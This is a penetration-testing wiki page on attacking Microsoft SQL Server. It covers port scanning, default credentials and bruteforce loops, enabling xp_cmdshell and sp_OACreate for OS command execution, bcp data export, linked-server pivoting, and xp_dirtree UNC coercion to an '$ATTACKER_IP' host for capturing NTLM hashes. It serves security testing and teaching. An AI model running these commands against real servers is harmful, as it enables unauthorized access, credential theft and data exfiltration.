---
authors: ShutdownRepo, felixbillieres
category: infra
---

# MSSQL

## Theory

Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It uses the Tabular Data Stream (TDS) protocol for client-server communication and typically runs on port `1433/TCP`. MSSQL supports Windows Authentication (integrated security) and SQL Server Authentication (username/password).

MSSQL databases are commonly found in enterprise environments and can contain sensitive information. Exploiting MSSQL can lead to:
* Data exfiltration
* Command execution on the database server
* Lateral movement within the network
* Privilege escalation

## Practice

### Enumeration

#### Port scanning

MSSQL typically runs on port `1433/TCP`, but it can be configured to run on custom ports. MSSQL also uses UDP port `1434` for the SQL Browser service, which helps discover SQL Server instances and named instances.

::: tabs

=== Unix-like

```bash
# Basic port scan
nmap -p 1433 $TARGET

# Service version detection
nmap -p 1433 -sV $TARGET

# Scan SQL Browser service (UDP 1434)
nmap -sU -p 1434 $TARGET
```

=== Windows

```powershell
# Basic port scan using Test-NetConnection
Test-NetConnection -ComputerName $TARGET -Port 1433

# Using nmap (if available)
nmap -p 1433 -sV $TARGET
nmap -sU -p 1434 $TARGET
```

:::

#### Service detection

MSSQL service information can be detected using network scanning tools. The TDS protocol requires a proper handshake, making simple banner grabbing unreliable.

::: tabs

=== Unix-like

```bash
# Service version detection
nmap -p 1433 -sV $TARGET

# MSSQL-specific scripts
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info $TARGET
```

=== Windows

```powershell
# Using nmap (if available)
nmap -p 1433 -sV $TARGET
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info $TARGET
```

:::

> [!NOTE]
> Simple banner grabbing via `nc` is unreliable because MSSQL uses the TDS protocol which requires a proper handshake. Service version detection using `nmap` provides more reliable results.

### Authentication

MSSQL supports two authentication methods:
* **Windows Authentication**: Uses Windows credentials (Kerberos/NTLM). Tools like NetExec attempt Windows Authentication (domain/NTLM/Kerberos depending on configuration) when a domain is provided.
* **SQL Server Authentication**: Uses SQL Server login credentials (username/password). SQL authentication must be explicitly used when providing SQL login credentials, according to tool options.

> [!TIP]
> It's important to distinguish between Windows Authentication and SQL Server Authentication. Tool options determine which authentication method is used based on the credentials provided. For example:
> * **Impacket mssqlclient.py**: Use `-windows-auth` flag for Windows Authentication; omit it for SQL Server Authentication.
> * **NetExec**: Authentication flags depend on the NetExec version and configuration. Check `netexec mssql -h` for current options.

#### Authentication enumeration

Check if SQL Server Authentication is enabled and enumerate authentication methods.

::: tabs

=== Unix-like

```bash
# Check if SQL Server Authentication is enabled
nmap -p 1433 --script ms-sql-info $TARGET
```

=== Windows

```powershell
# Using nmap (if available)
nmap -p 1433 --script ms-sql-info $TARGET
```

:::

#### Default credentials

Historically, MSSQL used `sa` / `sa` as default credentials, but since SQL Server 2005, Microsoft forces password selection during installation. Default credentials are mainly found on:

* Old SQL Server versions (pre-2005)
* Development environments
* Negligent administrator configurations

Common default credentials to test:
* `sa` / `sa`
* `sa` / `<empty>`
* `admin` / `admin`
* `administrator` / `administrator`

#### Bruteforce

::: tabs

=== Unix-like

```bash
# Using Hydra
hydra -l sa -P /path/to/passwords.txt $TARGET mssql

# Using nmap
nmap -p 1433 --script ms-sql-brute --script-args userdb=/path/to/users.txt,passdb=/path/to/passwords.txt $TARGET

# Using NetExec
netexec mssql $TARGET -u sa -p /path/to/passwords.txt
```

=== Windows

```powershell
# Using nmap (if available)
nmap -p 1433 --script ms-sql-brute --script-args userdb=/path/to/users.txt,passdb=/path/to/passwords.txt $TARGET

# Using NetExec (if available)
netexec mssql $TARGET -u sa -p /path/to/passwords.txt

# Using PowerShell for basic credential testing
$users = Get-Content users.txt
$passwords = Get-Content passwords.txt
foreach ($user in $users) {
    foreach ($pass in $passwords) {
        sqlcmd -S $TARGET -U $user -P $pass -Q "SELECT @@version" -W 2>$null
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Valid: $user:$pass"
        }
    }
}
```

:::

#### Windows Authentication

If MSSQL is configured for Windows Authentication, Windows credentials or Kerberos tickets can be used.

::: tabs

=== Unix-like

```bash
# With Windows credentials using Impacket mssqlclient.py
mssqlclient.py -p 1433 '$DOMAIN/$USER:$PASSWORD'@'$TARGET' -windows-auth

# With Kerberos ticket
export KRB5CCNAME=/path/to/ticket.ccache
mssqlclient.py -p 1433 '$DOMAIN/$USER'@'$TARGET' -windows-auth -k
```

=== Windows

```powershell
# Using sqlcmd with Windows Authentication (integrated security)
sqlcmd -S $TARGET -E

# Using sqlcmd with SQL Server Authentication (not Windows auth)
sqlcmd -S $TARGET -U $USER -P $PASSWORD

# Using Invoke-Sqlcmd (if SQL Server module is available)
Invoke-Sqlcmd -ServerInstance $TARGET -Query "SELECT @@version"
```

:::

### Database enumeration

Once authenticated, databases, tables, and users can be enumerated.

::: tabs

=== Unix-like

```bash
# Using Impacket mssqlclient.py (interactive console)
mssqlclient.py -p 1433 '$USER:$PASSWORD'@'$TARGET'
mssqlclient.py -p 1433 '$DOMAIN/$USER:$PASSWORD'@'$TARGET' -windows-auth

# Using sqsh
sqsh -S $TARGET -U $USER -P $PASSWORD
sqsh -S $TARGET -U $USER -P $PASSWORD -C "SELECT @@version"

# Using NetExec
netexec mssql $TARGET -u $USER -p $PASSWORD -q "SELECT @@version"
netexec mssql $TARGET -u $USER -p $PASSWORD -q "SELECT name FROM sys.databases;"
netexec mssql $TARGET -u $USER -p $PASSWORD -M enum_impersonate
netexec mssql $TARGET -u $USER -p $PASSWORD -M enum_logins
netexec mssql $TARGET -u $USER -p $PASSWORD --rid-brute
```

=== Windows

```powershell
# Using sqlcmd
sqlcmd -S $TARGET -U $USER -P $PASSWORD
sqlcmd -S $TARGET -U $USER -P $PASSWORD -Q "SELECT @@version"

# Using Invoke-Sqlcmd (if SQL Server module is available)
Invoke-Sqlcmd -ServerInstance $TARGET -Username $USER -Password $PASSWORD -Query "SELECT name FROM sys.databases;"

# Using NetExec (if available)
netexec mssql $TARGET -u $USER -p $PASSWORD -q "SELECT @@version"
netexec mssql $TARGET -u $USER -p $PASSWORD -M enum_impersonate
```

:::

Useful SQL queries once connected:

```sql
-- List databases
SELECT name FROM sys.databases;

-- List tables in current database
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

-- List columns in a table
SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';

-- List users
SELECT name FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN';

-- Check current user permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

### Exploitation

#### Command execution

MSSQL can execute operating system commands through stored procedures if the appropriate permissions are granted.

##### xp_cmdshell

`xp_cmdshell` is a stored procedure that allows executing Windows commands. It requires `sysadmin` role or explicit permissions. **xp_cmdshell is disabled by default since SQL Server 2005** and must be explicitly enabled.

```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute command
EXEC xp_cmdshell 'whoami';

-- Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```

> [!CAUTION]
> xp_cmdshell execution is logged and can be detected by security monitoring.

::: tabs

=== Unix-like

```bash
# Using NetExec to execute commands via xp_cmdshell
netexec mssql $TARGET -u sa -p '$PASSWORD' -x whoami

# Enable xp_cmdshell via SQL query
netexec mssql $TARGET -u sa -p '$PASSWORD' -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
```

=== Windows

```powershell
# Using sqlcmd to enable and use xp_cmdshell
sqlcmd -S $TARGET -U $USER -P $PASSWORD -Q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
sqlcmd -S $TARGET -U $USER -P $PASSWORD -Q "EXEC xp_cmdshell 'whoami'"

# Using NetExec (if available)
netexec mssql $TARGET -u sa -p '$PASSWORD' -x whoami
```

:::

##### sp_OACreate

`sp_OACreate` can be used to execute commands through COM objects. This requires `sysadmin` role and Ole Automation Procedures to be enabled. **Note**: Ole Automation Procedures are disabled by default on SQL Server 2017/2019 and may not work if certain security policies are enabled.

```sql
-- Enable Ole Automation Procedures
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Execute command using WScript.Shell
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami > C:\temp\output.txt';
EXEC sp_OADestroy @shell;
```

#### Data exfiltration

Sensitive data can be extracted from databases.

```sql
-- List all databases
SELECT name FROM sys.databases;

-- Switch to a database
USE database_name;

-- List tables
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

-- Extract data from a table
SELECT * FROM users;

-- Export data to file using bcp (requires appropriate permissions and bcp tool installed on server)
EXEC xp_cmdshell 'bcp "SELECT * FROM database.dbo.users" queryout C:\temp\users.txt -c -T';
```

> [!NOTE]
> The `bcp` (Bulk Copy Program) utility is typically a client-side tool but may be present on the server depending on the installation. This method depends on the server configuration and whether bcp is available on the server.

#### Linked servers

MSSQL can be configured with linked servers to access other databases. This can be exploited for lateral movement.

```sql
-- List linked servers
SELECT * FROM sys.servers;

-- Query linked server
SELECT * FROM OPENQUERY(linked_server, 'SELECT @@version');

-- Enable RPC OUT on linked server (required for command execution on some servers)
EXEC sp_serveroption 'linked_server_name', 'rpc out', 'true';
```

::: tabs

=== Unix-like

```bash
# Using NetExec to enumerate and interact with linked servers
netexec mssql $TARGET -u $USER -p $PASSWORD -M enum_links
netexec mssql $TARGET -u $USER -p $PASSWORD -M exec_on_link -o LINKED_SERVER="linked_server_name" -o QUERY="SELECT @@version"
netexec mssql $TARGET -u $USER -p $PASSWORD -M link_enable_cmdshell -o LINKED_SERVER="linked_server_name" -o ENABLE=true
netexec mssql $TARGET -u $USER -p $PASSWORD -M link_xpcmd -o LINKED_SERVER="linked_server_name" -o COMMAND="whoami"
```

=== Windows

```powershell
# Using sqlcmd to query linked servers
sqlcmd -S $TARGET -U $USER -P $PASSWORD -Q "SELECT * FROM sys.servers"
sqlcmd -S $TARGET -U $USER -P $PASSWORD -Q "SELECT * FROM OPENQUERY(linked_server, 'SELECT @@version')"

# Using NetExec (if available)
netexec mssql $TARGET -u $USER -p $PASSWORD -M enum_links
```

:::

#### UNC path injection and coercion

MSSQL can be used to force authentication to an attacker-controlled SMB server through UNC paths.

```sql
-- Force authentication to attacker SMB server
EXEC xp_dirtree '\\$ATTACKER_IP\share', 1, 1;

-- Or using xp_fileexist
EXEC xp_fileexist '\\$ATTACKER_IP\share\file.txt';
```

::: tabs

=== Unix-like

```bash
# Using NetExec to coerce authentication
netexec mssql $TARGET -u $USER -p $PASSWORD -M mssql_coerce -o LISTENER="$ATTACKER_IP"
```

=== Windows

```powershell
# Using sqlcmd to execute UNC path queries
sqlcmd -S $TARGET -U $USER -P $PASSWORD -Q "EXEC xp_dirtree '\\$ATTACKER_IP\share', 1, 1"

# Using NetExec (if available)
netexec mssql $TARGET -u $USER -p $PASSWORD -M mssql_coerce -o LISTENER="$ATTACKER_IP"
```

:::

> [!TIP]
> Use tools like [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to capture NTLM hashes from coerced connections.

### Navigation in database

#### Useful SQL queries

```sql
-- Get SQL Server version
SELECT @@version;

-- Get current user
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- Get server name
SELECT @@SERVERNAME;

-- List databases
SELECT name, database_id, create_date FROM sys.databases;

-- Get current database
SELECT DB_NAME();

-- List tables in current database
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

-- List columns in a specific table
SELECT COLUMN_NAME, DATA_TYPE, IS_NULLABLE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'table_name';

-- Count rows in a table
SELECT COUNT(*) FROM table_name;

-- Search for specific data
SELECT * FROM table_name WHERE column_name LIKE '%search_term%';

-- List stored procedures
SELECT ROUTINE_SCHEMA, ROUTINE_NAME FROM INFORMATION_SCHEMA.ROUTINES WHERE ROUTINE_TYPE = 'PROCEDURE';

-- List functions
SELECT ROUTINE_SCHEMA, ROUTINE_NAME FROM INFORMATION_SCHEMA.ROUTINES WHERE ROUTINE_TYPE = 'FUNCTION';

-- Check user permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');

-- List users and roles
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S', 'U', 'G');

-- List database users
SELECT name, type_desc FROM sys.database_principals;

-- Check if user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- List SQL Server logins
SELECT name, type_desc, is_disabled, create_date FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN';

-- Check users that can be impersonated
SELECT 
    p.name AS principal_name,
    p.type_desc AS principal_type,
    p.is_disabled,
    pr.name AS permission_name
FROM sys.server_principals p
INNER JOIN sys.server_permissions pr ON p.principal_id = pr.grantee_principal_id
WHERE pr.permission_name = 'IMPERSONATE';
```

## Resources

### References

- [Microsoft Docs — sqlcmd utility](https://learn.microsoft.com/en-us/sql/tools/sqlcmd-utility)
- [Microsoft Docs — xp_cmdshell Server Configuration Option](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- [Microsoft Docs — sp_configure (Transact-SQL)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql)
- [Microsoft Docs — Linked Servers](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine)
- [Microsoft Docs — Tabular Data Stream (TDS) Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/)
- [HackTricks — Pentesting MSSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

### Tools

- [Impacket — mssqlclient.py](https://github.com/fortra/impacket)
- [NetExec — MSSQL module documentation](https://www.netexec.wiki/)
